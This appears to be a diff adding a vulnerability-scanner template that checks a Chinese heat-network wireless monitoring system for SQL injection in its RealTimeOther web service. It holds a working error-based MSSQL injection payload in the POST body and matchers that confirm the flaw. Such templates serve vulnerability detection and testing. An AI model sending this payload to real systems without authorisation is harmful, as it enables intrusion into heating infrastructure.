@@ -1,0 +1,36 @@
+id: poc-yaml-heat-network-wms-realtimeother-sqli
+info:
+  name: 热网无线监测系统 RealTimeOther SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    Detects SQL Injection vulnerability in 热网无线监测系统 RealTimeOther module.
+
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+  t2: "{{md5(t1)}}"
+
+http:
+  - method: POST
+    path:
+      - "/DataSrvs/RealTimeOther.asmx/ChangeStationToOld"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "stationID=%28SELECT+CHAR%28113%29%2Bsys.fn_varbintohexstr(hashbytes('MD5','{{t1}}'))%2B%2B%28CASE+WHEN+%289253%3D9253%29+THEN+CHAR%2849%29+ELSE+CHAR%2848%29+END%29%2BCHAR%28113%29%29"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        part: body
+        words:
+          - "q0x{{t2}}"
+          - "SqlException"
+          - "RealTimeOther"
+      - type: regex
+        part: body
+        regex:
+          - "转换成数据类型(.*?)时失败"
+          - "在将(.*?)值"
